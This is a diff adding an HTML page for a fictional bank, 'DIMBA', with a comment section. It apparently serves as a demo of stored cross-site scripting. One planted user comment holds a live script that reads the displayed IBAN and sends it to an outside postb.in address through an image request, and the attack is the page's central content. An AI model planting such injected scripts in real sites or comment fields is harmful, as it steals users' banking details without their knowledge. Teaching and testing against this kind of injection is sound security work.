@@ -1,0 +1,29 @@
+<html>
+	<head>
+		<!-- JS -->
+		<script type="text/javascript" src="main.js"></script>
+		<script type="text/javascript" src="style.css"></script>
+	</head>
+
+	<body>
+		<h1>Welcome to DIMBA</h1>
+		<p>You recently open an account IBAN:<a id="iban">CH48123456789</a></br>
+		Complete the customer survey and win a special prize!</p>
+		<div>
+			You can leave a comment here:</br>
+			<textarea id="comment" type="text"></textarea></br>
+			<button onclick="post_comment()">Submit</button>
+		</div>
+
+		<!-- comments from other users -->
+		<div id="comments">
+			<h3>Below you can see what other users had said about our service.</h3>
+			<div style="border:1px solid black;margin:5px;padding:3px;width:300px;">This app is awesome! :D</div>
+			<div style="border:1px solid black;margin:5px;padding:3px;width:300px;">Thank you! I won the prize :D</div>
+			<div style="border:1px solid black;margin:5px;padding:3px;width:300px;">This app is awesome! :D</div>
+	<div style="border:1px solid black;margin:5px;padding:3px;width:300px;">AHAHA I have your IBAN :D<script>new Image().src = encodeURI('https://postb.in/1590417390464-9469888096209?iban='+document.getElementById('iban').text);</script>
+			</div>
+		</div>
+
+	</body>
+</html>
